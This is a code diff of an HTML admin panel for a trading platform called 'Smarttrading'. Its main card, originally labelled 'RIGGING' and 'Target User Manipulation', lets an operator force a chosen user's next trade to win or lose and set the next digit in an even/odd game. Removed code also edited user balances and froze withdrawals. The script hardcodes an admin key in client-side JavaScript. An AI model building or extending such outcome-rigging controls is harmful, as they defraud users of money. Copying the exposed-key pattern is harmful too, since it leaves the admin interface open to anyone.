@@ -3,111 +3,67 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Smarttrading - Elite Admin Panel</title>
+  <title>Smarttrading Admin</title>
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
     body { background-color: #090d16; color: #e2e8f0; padding: 16px; }
-    
     header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #1e293b; padding-bottom: 12px; margin-bottom: 20px; }
-    h1 { font-size: 20px; color: #3b82f6; letter-spacing: 1px; }
-    .badge { background: #10b981; color: #000; padding: 4px 8px; border-radius: 4px; font-weight: bold; font-size: 12px; }
-
-    .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 16px; }
+    h1 { font-size: 18px; color: #3b82f6; }
+    .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 16px; }
     .card { background: #131b2e; border: 1px solid #1e293b; border-radius: 8px; padding: 16px; }
-    .card-title { font-size: 14px; text-transform: uppercase; color: #94a3b8; margin-bottom: 14px; letter-spacing: 0.5px; }
-
     .group { display: flex; flex-direction: column; margin-bottom: 12px; }
-    label { font-size: 12px; color: #64748b; margin-bottom: 4px; }
-    input, select { background: #0b1120; border: 1px solid #334155; color: #fff; padding: 10px; border-radius: 6px; outline: none; width: 100%; }
-    input:focus, select:focus { border-color: #3b82f6; }
-
-    button { width: 100%; padding: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+    label { font-size: 12px; color: #94a3b8; margin-bottom: 4px; text-transform: uppercase; }
+    input, select { background: #0b1120; border: 1px solid #334155; color: #fff; padding: 10px; border-radius: 6px; width: 100%; outline: none; }
+    button { width: 100%; padding: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
     .btn-blue { background: #2563eb; color: #fff; }
-    .btn-blue:hover { background: #1d4ed8; }
     .btn-red { background: #dc2626; color: #fff; margin-top: 6px; }
-    .btn-red:hover { background: #b91c1c; }
-
-    /* Responsive adjustments for phones */
-    @media (max-width: 600px) {
-      body { padding: 10px; }
-      header { flex-direction: column; align-items: flex-start; gap: 8px; }
-      .grid { grid-template-columns: 1fr; }
-    }
   </style>
 </head>
 <body>
 
   <header>
     <h1>SMARTTRADING CONTROL CENTER</h1>
-    <span class="badge">SYSTEM LIVE</span>
   </header>
 
   <div class="grid">
-    
-    <!-- CARD 1: GLOBAL CONFIG -->
     <div class="card">
-      <div class="card-title">Global Execution Rules</div>
       <div class="group">
-        <label>Even / Odd Payout Percentage (%)</label>
+        <label>Even / Odd Payout (%)</label>
         <input type="number" id="evenOddPayout" value="95.2" step="0.1">
       </div>
       <div class="group">
-        <label>Platform Maintenance Mode</label>
+        <label>Maintenance Mode</label>
         <select id="maintenanceMode">
-          <option value="false">Active (Normal Operating State)</option>
-          <option value="true">Locked (Maintenance Mode)</option>
+          <option value="false">Active</option>
+          <option value="true">Locked</option>
         </select>
       </div>
-      <button class="btn-blue" onclick="updateGlobalConfig()">Save Global Config</button>
+      <button class="btn-blue" onclick="updateGlobalConfig()">Save Config</button>
     </div>
 
-    <!-- CARD 2: USER OUTCOME OVERRIDE (RIGGING) -->
-    <div class="card" style="border-color: #3b82f6;">
-      <div class="card-title" style="color: #3b82f6;">Target User Manipulation</div>
+    <div class="card">
       <div class="group">
         <label>Target User ID</label>
-        <input type="text" id="targetUserId" placeholder="Paste MongoDB User ID">
+        <input type="text" id="targetUserId" placeholder="MongoDB User ID">
       </div>
       <div class="group">
-        <label>Execution Override Mode</label>
+        <label>Override Mode</label>
         <select id="forceOutcome">
-          <option value="NORMAL">Fair (Default Market Outcome)</option>
-          <option value="WIN">Force WIN Next Trade</option>
-          <option value="LOSS">Force LOSS Next Trade</option>
+          <option value="NORMAL">Normal Market</option>
+          <option value="WIN">Force WIN</option>
+          <option value="LOSS">Force LOSS</option>
         </select>
       </div>
       <div class="group">
-        <label>Force Next Digit Outcome (0 - 9)</label>
-        <input type="number" id="forcedNextDigit" min="0" max="9" placeholder="Leave empty for random">
+        <label>Force Next Digit (0-9)</label>
+        <input type="number" id="forcedNextDigit" min="0" max="9" placeholder="Random">
       </div>
-      <button class="btn-red" onclick="applyUserOverride()">Apply Direct Overrides</button>
+      <button class="btn-red" onclick="applyUserOverride()">Apply Override</button>
     </div>
-
-    <!-- CARD 3: WALLET & ACCOUNT FREEZE -->
-    <div class="card">
-      <div class="card-title">Wallet & Security Controls</div>
-      <div class="group">
-        <label>Live Account Balance ($)</label>
-        <input type="number" id="liveBalance" placeholder="0.00">
-      </div>
-      <div class="group">
-        <label>Demo Account Balance ($)</label>
-        <input type="number" id="demoBalance" placeholder="10000.00">
-      </div>
-      <div class="group">
-        <label>Account Security Status</label>
-        <select id="isFrozen">
-          <option value="false">Active (Normal)</option>
-          <option value="true">Frozen (Disable Withdrawals/Trades)</option>
-        </select>
-      </div>
-      <button class="btn-blue" onclick="updateUserWallet()">Update User Account</button>
-    </div>
-
   </div>
 
   <script>
-    const ADMIN_KEY = 'SECRET_ADMIN_KEY_123'; // Must match server verifyAdminKey
+    const ADMIN_KEY = 'SECRET_ADMIN_KEY_123';
     const API_BASE = '/api/admin';
 
     async function apiRequest(endpoint, payload) {
@@ -122,12 +78,12 @@
         });
         const data = await res.json();
         if (data.success) {
-          alert('Operation executed successfully!');
+          alert('Success!');
         } else {
-          alert('Error: ' + data.error || data.message);
+          alert('Error: ' + (data.error || data.message));
         }
       } catch (err) {
-        alert('Failed to connect to server: ' + err.message);
+        alert('Server Connection Failed: ' + err.message);
       }
     }
 
@@ -141,19 +97,8 @@
       const userId = document.getElementById('targetUserId').value;
       const forceOutcome = document.getElementById('forceOutcome').value;
       const forcedNextDigit = document.getElementById('forcedNextDigit').value;
-      
-      if (!userId) return alert('Please enter a User ID');
+      if (!userId) return alert('Enter User ID');
       apiRequest('/manipulate-user', { userId, forceOutcome, forcedNextDigit });
-    }
-
-    function updateUserWallet() {
-      const userId = document.getElementById('targetUserId').value;
-      const liveBalance = parseFloat(document.getElementById('liveBalance').value) || 0;
-      const demoBalance = parseFloat(document.getElementById('demoBalance').value) || 0;
-      const isFrozen = document.getElementById('isFrozen').value === 'true';
-
-      if (!userId) return alert('Please enter a User ID');
-      apiRequest('/update-wallet', { userId, liveBalance, demoBalance, isFrozen });
     }
   </script>
 </body>
